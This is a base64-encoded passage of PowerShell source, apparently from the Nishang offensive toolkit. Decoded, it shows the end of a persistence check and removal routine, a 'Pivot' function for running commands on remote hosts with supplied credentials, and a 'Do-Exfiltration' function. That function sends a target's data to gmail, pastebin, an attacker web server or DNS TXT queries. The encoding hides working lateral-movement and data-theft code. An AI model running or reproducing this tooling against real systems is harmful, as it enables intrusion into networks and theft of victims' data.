ZS1XbWlPYmplY3QKICAgICAgICBXcml0ZS1PdXRwdXQgIlJlbW92aW5nIHRoZSBSZWdpc3RyeSBrZXlzLiIKICAgICAgICBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoIEhLQ1U6U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXCAtTmFtZSBVcGRhdGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KICAgICRSZWdrZXkgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoIEhLQ1U6U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXCAtbmFtZSBVcGRhdGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICR3bWlfMSA9IGd3bWkgX19ldmVudEZpbHRlciAtbmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1maWx0ZXIgIm5hbWU9J1dpbmRvd3NTYW5pdHknIgogICAgJHdtaV8yID0gZ3dtaSBhY3RpdmVTY3JpcHRFdmVudENvbnN1bWVyIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24KICAgICR3bWlfMyA9IGd3bWkgX19maWx0ZXJ0b2NvbnN1bWVyYmluZGluZyAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1GaWx0ZXIgIkZpbHRlciA9ICIiX19ldmVudGZpbHRlci5uYW1lPSdXaW5kb3dzU2FuaXR5JyIiIgogICAgaWYgKCRSZWdrZXkgLW5lICRudWxsICkKICAgIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJSdW4gUmVnaXN0cnkga2V5IHBlcnNpc3RlbmNlIGZvdW5kLiBVc2Ugd2l0aCAtUmVtb3ZlIG9wdGlvbiB0byBjbGVhbi4iCiAgICB9CiAgICBlbHNlaWYgKCgkd21pXzEpIC1hbmQgKCR3bWlfMikgLWFuZCAoJHdtaV8zKSAtbmUgJG51bGwpICAgIAogICAgewogICAgICAgIFdyaXRlLVdhcm5pbmcgIldNSSBwZXJtYW5lbnQgZXZlbnQgY29uc3VtZXIgcGVyc2lzdGVuY2UgZm91bmQuIFVzZSB3aXRoIC1SZW1vdmUgb3B0aW9uIHRvIGNsZWFuLiIKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIk5vIFBlcnNpc3RlbmNlIGZvdW5kLiIKICAgIH0KfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1Bpdm90aW5nIHRvIG90aGVyIHN5c3RlbXMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIFBpdm90CnsKCjwjCi5TWU5PUFNJUwpGdW5jdGlvbiB3aGljaCBwcm92aWRlcyBwaXZvdGluZyB0byBvdGhlciBtYWNoaW5lcyBpbiBhIG5ldHdvcmsuCgouREVTQ1JJUFRJT04KVGhlIGZ1bmN0aW9uYWxpdHkgdXNlcyBwb3dlcnNoZWxsIHJlbW90aW5nIHRvIGNvbm5lY3QgdG8gcmVtb3RlIG1hY2hpbmVzLiBQaXZvdGluZyBjb3VsZCBiZSBpbnRlcmFjdGl2ZSBvciBub24taW50ZXJhY3RpdmUuCkNyZWRlbnRpYWxzIGFyZSByZXF1aXJlZCB0byB1c2UgdGhpcyBmdW5jdGlvbi4gVXNlcm5hbWUvcGFzcyBvciBhIHNoZWxsIHdpdGggcmlnaHRzIHRvIGFjY2VzcyByZW1vdGUgbWFjaGluZXMgY291bGQgYmUgdXNlZCBhcyBjcmVkZW50aWFscy4KCi5QQVJBTUVURVIgQ29tcHV0ZXIKTmFtZSBvZiB0aGUgY29tcHV0ZXIocykgdG8gY29ubmVjdCB0by4gCgouUEFSQU1FVEVSIFVzZXIKVXNlcm5hbWUgdG8gYmUgdXNlZCB0byBjb25uZWN0IHRvIHRoZSB0YXJnZXQgKG9wdGlvbmFsKS4KCi5QQVJBTUVURVIgUGFzcwpQYXNzd29yZCB0byBiZSB1c2VkIHRvIGNvbm5lY3QgdG8gdGhlIHRhcmdldCAob3B0aW9uYWwpLgoKLlBBUkFNRVRFUiBjbWQKQ21kIHRvIGJlIGV4ZWN1dGVkIG9uIHRoZSB0YXJnZXQuIE1hbmRhdG9yeSBpbiBjYXNlIG9mIG5vbi1pbnRlcmFjdGl2ZS4KCi5QQVJBTUVURVIgTm9uX0ludGVyYWN0aXZlCklmIHNwZWNpZmllZCwgdGhlIHBpdnRvaW5nIGlzIG5vbi1pbnRlcmFjdGl2ZS4gSXQgaXMgaW50ZXJhY3RpdmUgYnkgZGVmYXVsdC4KCi5FWEFNUExFClBTID4gUGl2b3QgLUNvbXB1dGVyIDx0YXJnZXQ+CkFib3ZlIGNvbW1hbmQgdXNlcyB0aGUgY3JlZGVudGlhbHMgYXZhaWxhYmxlIHdpdGggY3VycmVudCBwb3dlcnNoZWxsIHNlc3Npb24gKG9yIG90aGVyIHNoZWxsKSB0byBjb25uZWN0IHRvIHRhcmdldC4KSXQgY3JlYXRlcyBQU1NzZXNzaW9ucy4gVXNlIFVzZS1TZXNzaW9uIHRvIGludGVyYWN0IHdpdGggdGhlIGNyZWF0ZWQgc2Vzc2lvbnMuCgouRVhBTVBMRQpQUyA+IFBpdm90IC1Db21wdXRlciA8R2V0LUNvbnRlbnQgLlx0YXJnZXRzLnR4dD4gLVVzZXIgQWRtaW5pc3RyYXRvciAtUGFzcyBQQHNzd29yZDEyMyMgIApBYm92ZSBjb21tYW5kIGFza3MgdGhlIHVzZXIgdG8gcHJvdmlkZSB1c2VybmFtZSBhbmQgcGFzc293cmQgYW5kIGNyZWF0ZXMgUFNTZXNzaW9ucy4gVXNlIFVzZS1TZXNzaW9uIHRvCmludGVyYWN0IHdpdGggdGhlIGNyZWF0ZWQgc2Vzc2lvbnMuCgpQUyA+IFBpdm90IC1Db21wdXRlciA8dGFyZ2V0PiAtY21kIEdldC1Qcm9jZXNzIC1Ob25fSW50ZXJhY3RpdmUKQWJvdmUgY29tbWFuZCB1c2VzIHRoZSBjcmVkZW50aWFscyBhdmFpbGFibGUgd2l0aCBjdXJyZW50IHBvd2Vyc2hlbGwgc2Vzc2lvbiAob3Igb3RoZXIgc2hlbGwpIHRvIGNvbm5lY3QgdG8gdGFyZ2V0LgpJdCBwcm92aWRlcyBhIG5vbi1pbnRlcmFjdGl2ZSBwaXZvdC4gR2V0LVByb2Nlc3MgaXMgZXhlY3V0ZWQgb24gdGhlIHRhcmdldC4KCi5FWEFNUExFClBTID4gUGl2b3QgLUNvbXB1dGVyIDx0YXJnZXQ+IC1Vc2VyIEFkbWluaXN0cmF0b3IgLVBhc3MgUEBzc3dvcmQxMjMjIC1jbWQgR2V0LVByb2Nlc3MgCkFib3ZlIGNvbW1hbmQgYXNrcyB0aGUgdXNlciB0byBwcm92aWRlIHVzZXJuYW1lIGFuZCBwYXNzb3dyZCBhbmQgY3JlYXRlcyBQU1Nlc3Npb25zLgpHZXQtUHJvY2VzcyBpcyBleGVjdXRlZCBvbiB0aGUgdGFyZ2V0LiBVc2UgVXNlLVNlc3Npb24gdG8gaW50ZXJhY3Qgd2l0aCB0aGUgY3JlYXRlZCBzZXNzaW9ucy4KCi5MSU5LCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgoKCiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSAoIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlciwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXNzLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkY21kLAoKICAgICAgICBbU3dpdGNoXSAkTm9uX0ludGVyYWN0aXZlCiAgICApCgogICAgI0ludGVyYWN0aXZlIHBpdm90aW5nCiAgICBpZiAoJE5vbl9JbnRlcmFjdGl2ZSAtZXEgJGZhbHNlKQogICAgewogICAgICAgIGlmICgkVXNlcikKICAgICAgICB7CiAgICAgICAgICAgICRQYXNzd2QgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICRQYXNzIC1Bc1BsYWluVGV4dCAtRm9yY2UKICAgICAgICAgICAgJENyZWRzID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAoJFVzZXIsICRQYXNzd2QpCiAgICAgICAgICAgIGZvcmVhY2ggKCRjb21wIGluICRDb21wdXRlcikKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIE5ldy1QU1Nlc3Npb24gLUNvbXB1dGVyTmFtZSAkY29tcCAtQ3JlZGVudGlhbCAkQ3JlZHMKICAgICAgICAgICAgfQoKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgTmV3LVBTU2Vzc2lvbiAtQ29tcHV0ZXJOYW1lICRDb21wdXRlcgoKICAgICAgICB9CiAgICB9CiAgICAjTm9uLUludGVyYWN0aXZlIHBpdm90aW5nIChjb21tYW5kIGV4ZWN1dGlvbiBvbiByZW1vdGUgbWFjaGluZXMpIHVzaW5nIEludm9rZS1Db21tYW5kCiAgICBpZiAoJE5vbl9JbnRlcmFjdGl2ZSAtZXEgJHRydWUpCiAgICB7CiAgICBpZiAoJFVzZXIpCiAgICAgICAgewogICAgICAgICAgICAKICAgICAgICAgICAgJFBhc3N3ZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJFBhc3MgLUFzUGxhaW5UZXh0IC1Gb3JjZQogICAgICAgICAgICAkQ3JlZHMgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsICgkVXNlciwgJFBhc3N3ZCkKICAgICAgICAgICAgJHNiID0gW3NjcmlwdGJsb2NrXTo6Q3JlYXRlKCRjbWQpCiAgICAgICAgICAgIGZvcmVhY2ggKCRjb21wIGluICRDb21wdXRlcikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHJlc3VsdCA9IEludm9rZS1Db21tYW5kIC1Db21wdXRlck5hbWUgJGNvbXAgLUNyZWRlbnRpYWwgJENyZWRzIC1TY3JpcHRCbG9jayAkc2IKICAgICAgICAgICAgICAgICJPdXRwdXQgb2YgY29tbWFuZCBvbiAkY29tcCAiICsgJHJlc3VsdAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRjb21wIGluICRDb21wdXRlcikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLUNvbXB1dGVyTmFtZSAkY29tcCAtU2NyaXB0QmxvY2sgeyRDb21tYW5kfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgIH0KICAgIH0KICAgIAp9CgpmdW5jdGlvbiBVc2UtU2Vzc2lvbgp7CjwjCi5TWU5PUFNJUwpGdW5jdGlvbiB3aGljaCBjb3VsZCBiZSB1c2VkIHRvIGludGVyYWN0IHdpdGggc2Vzc2lvbnMgY3JlYXRlZCB1c2luZyBQaXZvdC4KCi5ERVNDUklQVElPTgpUaGUgZnVuY3Rpb25hbGl0eSBhbGxvd3MgdG8gaW50ZXJhY3Qgd2l0aCBzZXNzaW9ucyBjcmVhdGVkIHVzaW5nIHRoZSBQaXZvdCBmdW5jdGlvbi4gVXNlIEdldC1QU1NTZXNzaW9uIHRvCmxpc3QgdGhlIHNlc3Npb25zIGNyZWF0ZWQgdXNpbmcgUGl2b3QuCgouUEFSQU1FVEVSIGlkCklEIG9mIHRoZSBzZXNzaW9uIHRvIGludGVyYWN0IHdpdGguIAoKLkVYQU1QTEUKUFMgPiBVc2UtU2Vzc2lvbiAtaWQgPGlkPgpBYm92ZSBjb21tYW5kIHVzZXMgdGhlIGNyZWRlbnRpYWxzIGF2YWlsYWJsZSB3aXRoIGN1cnJlbnQgcG93ZXJzaGVsbCBzZXNzaW9uIChvciBvdGhlciBzaGVsbCkgdG8gY29ubmVjdCB0byB0YXJnZXQuCkl0IGNyZWF0ZXMgUFNTc2Vzc2lvbnMuIFVzZSBVc2UtU2Vzc2lvbiB0byBpbnRlcmFjdCB3aXRoIHRoZSBjcmVhdGVkIHNlc3Npb25zLgoKLkxJTksKaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICRpZAogICAgKQoKICAgIHdoaWxlKCRjbWQgLW5lICJleGl0IikKICAgIHsKICAgICAgICAkc2VzcyA9IEdldC1QU1Nlc3Npb24gLUlkICRpZAogICAgICAgICRjb21wdXRlcm5hbWUgPSAkc2Vzcy5Db21wdXRlck5hbWUKICAgICAgICB3cml0ZS1ob3N0IC1Ob05ld2xpbmUgIiRjb21wdXRlcm5hbWU+ICIKICAgICAgICAkY21kID0gcmVhZC1ob3N0CiAgICAgICAgJHNiID0gW3NjcmlwdGJsb2NrXTo6Q3JlYXRlKCRjbWQpCiAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRzYiAtU2Vzc2lvbiAkc2VzcwogICAgfQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNFeGZpbHRyYXRpb24gRnVuY3Rpb25hbGl0eSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZnVuY3Rpb24gRG8tRXhmaWx0cmF0aW9uCnsKPCMKLlNZTk9QU0lTClVzZSB0aGlzIGZ1bmN0aW9uIHRvIGV4ZmlsdHJhdGUgZGF0YSBmcm9tIGEgdGFyZ2V0LgoKLkRFU0NSSVBUSU9OClRoaXMgZnVuY3Rpb24gY291bGQgYmUgdXNlZCB0byBleGZpbHRyYXRlIGRhdGEgZnJvbSBhIHRhcmdldCB0byBnbWFpbCwgcGFzdGViaW4sIGEgd2Vic2VydmVyIHdoaWNoIGNvdWxkIGxvZyBQT1NUIHJlcXVlc3RzCmFuZCBhIEROUyBTZXJ2ZXIgd2hpY2ggY291bGQgbG9nIFRYVCBxdWVyaWVzLiBUbyBkZWNvZGUgdGhlIGRhdGEgZXhmaWx0cmF0ZWQgYnkgd2Vic2VydmVyIGFuZCBETlMgbWV0aG9kcyB1c2UgSW52b2tlLURlY29kZS4KCi5QQVJBTUVURVIgRGF0YQpUaGUgZGF0YSB0byBiZSBleGZpbHRyYXRlZC4gQ291bGQgYmUgc3VwcGxpZWQgYnkgcGlwZWxpbmUuIAoKLlBBUkFNRVRFUiBFeGZpbE9wdGlvbgpUaGUgbWV0aG9kIHlvdSB3YW50IHRvIHVzZSBmb3IgZXhmaXRyYXRpb24gb2YgZGF0YS4gVmFsaWQgb3B0aW9ucyBhcmUgImdtYWlsIiwicGFzdGViaW4iLCJXZWJTZXJ2ZXIiIGFuZCAiRE5TIi4KCi5QQVJBTUVURVIgZGV2X2tleQpUaGUgVW5pcXVlIEFQSSBrZXkgcHJvdmlkZWQgYnkgcGFzdGViaW4gd2hlbiB5b3UgcmVnaXN0ZXIgYSBmcmVlIGFjY291bnQuClVudXNlZCBmb3Igb3RoZXIgb3B0aW9ucwoKLlBBUkFNRVRFUiB1c2VybmFtZQpVc2VybmFtZSBmb3IgdGhlIHBhc3RlYmluL2dtYWlsIGFjY291bnQgd2hlcmUgZGF0YSB3b3VsZCBiZSBleGZpbHRyYXRlZC4KVW51c2VkIGZvciBvdGhlciBvcHRpb25zCgouUEFSQU1FVEVSIHBhc3N3b3JkClBhc3N3b3JkIGZvciB0aGUgcGFzdGViaW4vZ21haWwgYWNjb3VudCB3aGVyZSBkYXRhIHdvdWxkIGJlIGV4ZmlsdHJhdGVkLgpVbnVzZWQgZm9yIG90aGVyIG9wdGlvbnMKCi5QQVJBTUVURVIgVVJMClRoZSBVUkwgb2YgdGhlIHdlYnNlcnZlciB3aGVyZSBQT1NUIHJlcXVlc3RzIHdvdWxkIGJlIHNlbnQuCgouUEFSQU1FVEVSIERvbWFpbk5hbWUKVGhlIERvbWFpbk5hbWUsIHdob3NlIHN1YmRvbWFpbnMgd291bGQgYmUgdXNlZCBmb3Igc2VuZGluZyBUWFQgcXVlcmllcyB0by4KCi5QQVJBTUVURVIgQXV0aE5TCkF1dGhvcml0YXRpdmUgTmFtZSBTZXJ2ZXIgZm9yIHRoZSBkb21haW4gc3BlY2lmaWVkIGluIERvbWFpbk5hbWUKCgouRVhBTVBMRQpQUyA+IEdldC1JbmZvcm1hdGlvbiB8IERvLUV4ZmlsdHJhdGlvbiAtRXhmaWxPcHRpb24gZ21haWwgLXVzZXJuYW1lIDw+IC1QYXNzd29yZCA8PgoKVXNlIGFib3ZlIGNvbW1hbmQgZm9yIGRhdGEgZXhmaWx0cmF0aW9uIHRvIGdtYWlsCgouRVhBTVBMRQpQUyA+IEdldC1JbmZvcm1hdGlvbiB8IERvLUV4ZmlsdHJhdGlvbiAtRXhmaWxPcHRpb24gV2Vic2VydmVyIC1VUkwgaHR0cDovLzE5Mi4xNjguMjU0LjE4My9jYXRjaHBvc3QucGhwCgpVc2UgYWJvdmUgY29tbWFuZCBmb3IgZGF0YSBleGZpbHRyYXRpb24gdG8gYSB3ZWJzZXJ2ZXIgd2hpY2ggbG9ncyBQT1NUIHJlcXVlc3RzLgoKCi5FWEFNUExFClBTID4gR2V0LUluZm9ybWF0aW9uIHwgRG8tRXhmaWx0cmF0aW9uIC1FeGZpbE9wdGlvbiBETlMgLURvbWFpbk5hbWUgZXhhbXBsZS5jb20gLUF1dGhOUyAxOTIuMTY4LjI1NC4yMjgKClVzZSBhYm92ZSBjb21tYW5kIGZvciBkYXRhIGV4ZmlsdHJhdGlvbiB0byBhIEROUyBzZXJ2ZXIgd2hpY2ggbG9ncyBUWFQgcXVlcmllcy4KCgouTElOSwpodHRwOi8vbGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLwpodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZUxpbmUgPSAkVHJ1ZSldIAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERhdGEsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlKV0gW1ZhbGlkYXRlU2V0KCJnbWFpbCIsInBhc3RlYmluIiwiV2ViU2VydmVyIiwiRE5TIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRXhmaWxPcHRpb24sCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkRmFsc2UpXSAKICAgICAgICBbU3RyaW5nXQogICAgICAgICRkZXZfa2V5LAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICR1c2VybmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkcGFzc3dvcmQsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVSTCwKICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDYsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDcsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQXV0aE5TCiAgICApCgogICAgZnVuY3Rpb24gcG9zdF9odHRwKCR1cmwsJHBhcmFtZXRlcnMpIAogICAgeyAKICAgICAgICAkaHR0cF9yZXF1ZXN0ID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IE1zeG1sMi5YTUxIVFRQIAogICAgICAgICRodHRwX3JlcXVlc3Qub3BlbigiUE9TVCIsICR1cmwsICRmYWxzZSkgCiAgICAgICAgJGh0dHBfcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSAKICAgICAgICAkaHR0cF9yZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtbGVuZ3RoIiwgJHBhcmFtZXRlcnMubGVuZ3RoKTsgCiAgICAgICAgJGh0dHBfcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb25uZWN0aW9uIiwgImNsb3NlIikgCiAgICAgICAgJGh0dHBfcmVxdWVzdC5zZW5kKCRwYXJhbWV0ZXJzKSAKICAgICAgICAkc2NyaXB0OnNlc3Npb25fa2V5PSRodHRwX3JlcXVlc3QucmVzcG9uc2VUZXh0IAogICAgfSAKCiAgICBmdW5jdGlvbiBDb21wcmVzcy1FbmNvZGUKICAgIHsKICAgICAgICAjQ29tcHJlc3Npb24gbG9naWMgZnJvbSBodHRwOi8vd3d3LmRhcmtvcGVyYXRvci5jb20vYmxvZy8yMDEzLzMvMjEvcG93ZXJzaGVsbC1iYXNpY3MtZXhlY3V0aW9uLXBvbGljeS1hbmQtY29kZS1zaWduaW5nLXBhcnQtMi5odG1sCiAgICAgICAgJG1zID0gTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0KICAgICAgICAkYWN0aW9uID0gW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkNvbXByZXNzCiAgICAgICAgJGNzID0gTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtICgkbXMsJGFjdGlvbikKICAgICAgICAkc3cgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlciAoJGNzLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKQogICAgICAgICREYXRhIHwgRm9yRWFjaC1PYmplY3QgeyRzdy5Xcml0ZUxpbmUoJF8pfQogICAgICAgICRzdy5DbG9zZSgpCiAgICAgICAgJENvbXByZXNzZWQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRtcy5Ub0FycmF5KCkpCiAgICAgICAgcmV0dXJuICRDb21wcmVzc2VkCiAgICB9CgogICAgaWYgKCRleGZpbG9wdGlvbiAtZXEgInBhc3RlYmluIikKICAgIHsKICAgICAgICAkdXRmYnl0ZXMgID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkRGF0YSkKICAgICAgICAkcGFzdGV2YWx1ZSA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCR1dGZieXRlcykKICAgICAgICAkcGFzdGVuYW1lID0gIkV4ZmlsdHJhdGVkIERhdGEiCiAgICAgICAgcG9zdF9odHRwICJodHRwczovL3Bhc3RlYmluLmNvbS9hcGkvYXBpX2xvZ2luLnBocCIgImFwaV9kZXZfa2V5PSRkZXZfa2V5JmFwaV91c2VyX25hbWU9JHVzZXJuYW1lJmFwaV91c2VyX3Bhc3N3b3JkPSRwYXNzd29yZCIgCiAgICAgICAgcG9zdF9odHRwICJodHRwczovL3Bhc3RlYmluLmNvbS9hcGkvYXBpX3Bvc3QucGhwIiAiYXBpX3VzZXJfa2V5PSRzZXNzaW9uX2tleSZhcGlfb3B0aW9uPXBhc3RlJmFwaV9kZXZfa2V5PSRkZXZfa2V5JmFwaV9wYXN0ZV9uYW1lPSRwYXN0ZW5hbWUmYXBpX3Bhc3RlX2NvZGU9JHBhc3RldmFsdWUmYXBpX3Bhc3RlX3ByaXZhdGU9MiIgCiAgICB9CiAgICAgICAgCiAgICBlbHNlaWYgKCRleGZpbG9wdGlvbiAtZXEgImdtYWlsIikKICAgIHsKICAgICAgICAjaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8xMjUyMzM1L3NlbmQtbWFpbC12aWEtZ21haWwtd2l0aC1wb3dlcnNoZWxsLXYycy1zZW5kLW1haWxtZXNzYWdlCiAgICAgICAgJHNtdHBzZXJ2ZXIgPSDDouKCrMWTc210cC5nbWFpbC5jb23DouKCrAogICAgICAgICRtc2cgPSBuZXctb2JqZWN0IE5ldC5NYWlsLk1haWxNZXNzYWdlCiAgICAgICAgJHNtdHAgPSBuZXctb2JqZWN0IE5ldC5NYWlsLlNtdHBDbGllbnQoJHNtdHBTZXJ2ZXIgKQogICAgICAgICRzbXRwLkVuYWJsZVNzbCA9ICRUcnVlCiAgICAgICAgJHNtdHAuQ3JlZGVudGlhbHMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoIiR1c2VybmFtZSIsICIkcGFzc3dvcmQiKTsgCiAgICAgICAgJG1zZy5Gcm9tID0gIiR1c2VybmFtZUBnbWFpbC5jb20iCiAgICAgICAgJG1zZy5Uby5BZGQoIiR1c2VybmFtZUBnbWFpbC5jb20iKQogICAgICAgICRtc2cuU3ViamVjdCA9ICJFeGZpbHRyYXRlZCBEYXRhIgogICAgICAgICRtc2cuQm9keSA9ICREYXRhCiAgICAgICAgaWYgKCRmaWxlbmFtZSkKICAgICAgICB7CiAgICAgICAgICAgICRhdHQgPSBuZXctb2JqZWN0IE5ldC5NYWlsLkF0dGFjaG1lbnQoJGZpbGVuYW1lKQogICAgICAgICAgICAkbXNnLkF0dGFjaG1lbnRzLkFkZCgkYXR0KQogICAgICAgIH0KICAgICAgICAkc210cC5TZW5kKCRtc2cpCiAgICB9CgogICAgZWxzZWlmICgkZXhmaWxvcHRpb24gLWVxICJ3ZWJzZXJ2ZXIiKQogICAgewogICAgICAgICREYXRhID0gQ29tcHJlc3MtRW5jb2RlICAgIAogICAgICAgIHBvc3RfaHR0cCAkVVJMICREYXRhCiAgICB9CiAgICBlbHNlaWYgKCRFeGZpbE9wdGlvbiAtZXEgIkROUyIpCiAgICB7CiAgICAgICAgJGNvZGUgPSBDb21wcmVzcy1FbmNvZGUKICAgICAgICAkcXVlcmllcyA9IFtpbnRdKCRjb2RlLkxlbmd0aC82MykKICAgICAgICB3aGlsZSAoJHF1ZXJpZXMgLW5lIDApCiAgICAgICAgewogICAgICAgICAgICAkcXVlcnlzdHJpbmcgPSAkY29kZS5TdWJzdHJpbmcoJGxlbmd0aG9mc3Vic3RyLDYzKQogICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAibnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgJHF1ZXJ5c3RyaW5nLiREb21haW5OYW1lICRBdXRoTlMiCiAgICAgICAgICAgICRsZW5ndGhvZnN1YnN0ciArPSA2MwogICAgICAgICAgICAkcXVlcmllcyAtPSAxCiAgICAgICAgfQogICAgICAgICRtb2QgPSAkY29kZS5MZW5ndGglNjMKICAgICAgICAkcXVlcnkgPSAkY29kZS5TdWJzdHJpbmcoJGNvZGUuTGVuZ3RoIC0gJG1vZCwgJG1vZCkKICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAibnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgJHF1ZXJ5LiREb21haW5OYW1lICRBdXRoTlMiCgogICAgfQoKfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjQ29tcHJlc3MgYW5kIEVuY29kZSBzY3JpcHRzIGFuZCBzdHJpbmdzIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpmdW5jdGlvbiBJbnZva2UtRW5jb2RlCnsKPCMKLlNZTk9QU0lTClNjcmlwdCBmb3IgTmlzaGFuZyB0byBlbmNvZGUgYW5kIGNvbXByZXNzIHBsYWluIGRhdGEuCgouREVTQ1JJUFRJT04KVGhlIHNjcmlwdCBhc2tzIGZvciBhIHBhdGggdG8gYSBwbGFpbiBmaWxlLCBlbmNvZGVzIGl0IGFuZCB3cml0ZXMgdG8gYSBmaWxlICJlbmNvZGVkLnR4dCIgaW4gdGhlIGN1cnJlbnQgd29ya2luZyBkaXJlY3RvcnkuCgpJZiB0aGUgc3dpdGNoIC1PdXRDb21tYW5kIGlzIHVzZWQuIEFuIGVuY29kZWQgY29tbWFuZCB3aGljaCBj